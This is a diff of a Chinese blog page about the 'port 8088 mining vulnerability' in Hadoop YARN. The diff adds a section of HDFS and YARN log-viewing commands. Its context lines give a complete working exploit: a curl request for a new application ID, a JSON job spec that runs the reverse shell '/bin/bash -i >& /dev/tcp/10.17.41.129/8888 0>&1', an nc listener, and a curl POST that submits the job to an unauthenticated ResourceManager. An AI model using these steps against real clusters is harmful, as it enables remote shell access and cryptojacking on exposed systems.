@@ -19,7 +19,7 @@
 <meta property="og:description" content="8088挖矿漏洞发起获取appIDcurl -X POST http:&#x2F;&#x2F;10.33.21.190:8088&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application 新建任务信息文件1.json反弹shell{‘application-id’: ‘application_1639358619460_0019’,‘application-name’: ‘get-shell’,‘am-c">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-01-20T14:11:43.000Z">
-<meta property="article:modified_time" content="2022-08-26T09:03:59.503Z">
+<meta property="article:modified_time" content="2022-09-16T04:03:02.626Z">
 <meta property="article:author" content="Manhua">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:creator" content="@jiangmanhua">
@@ -100,7 +100,7 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#8088%E6%8C%96%E7%9F%BF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">8088挖矿漏洞</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#8088%E6%8C%96%E7%9F%BF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">8088挖矿漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97"><span class="toc-number">2.</span> <span class="toc-text">查看日志</span></a></li></ol>
 		
 		</div>
 		
@@ -108,6 +108,7 @@
 <p>新建任务信息文件1.json反弹shell<br>{<br>‘application-id’: ‘application_1639358619460_0019’,<br>‘application-name’: ‘get-shell’,<br>‘am-container-spec’: {<br>‘commands’: {<br>‘command’: ‘/bin/bash -i &gt;&amp; /dev/tcp/10.17.41.129/8888 0&gt;&amp;1’<br>}<br>},<br>‘application-type’: ‘YARN’<br>}</p>
 <p>启动监听<br>nc -lvvp 8888</p>
 <p>发起任务<br>curl -s -i -X POST -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ <a target="_blank" rel="noopener" href="http://10.33.21.190:8088/ws/v1/cluster/apps">http://10.33.21.190:8088/ws/v1/cluster/apps</a> –data-binary @1.json</p>
+<h1 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h1><p>Yarn:<br><a target="_blank" rel="noopener" href="http://xx:8088/cluster?user.name=yarn">http://xx:8088/cluster?user.name=yarn</a><br><a target="_blank" rel="noopener" href="http://xx:8088/proxy/application_1660270769302_1399007">http://xx:8088/proxy/application_1660270769302_1399007</a><br>hdfs dfs -ls /spark2-history/ |grep application_1660270769302_1399007<br>hdfs dfs -ls /app-logs/xx/logs/application_1660270769302_3305625 |head<br>yarn logs -appOwner xx -applicationId application_1660270769302_3305625 -out t1<br>ls -R out/* |grep 01_000001</p>
   
 	</div>
 		<footer class="article-footer clearfix">
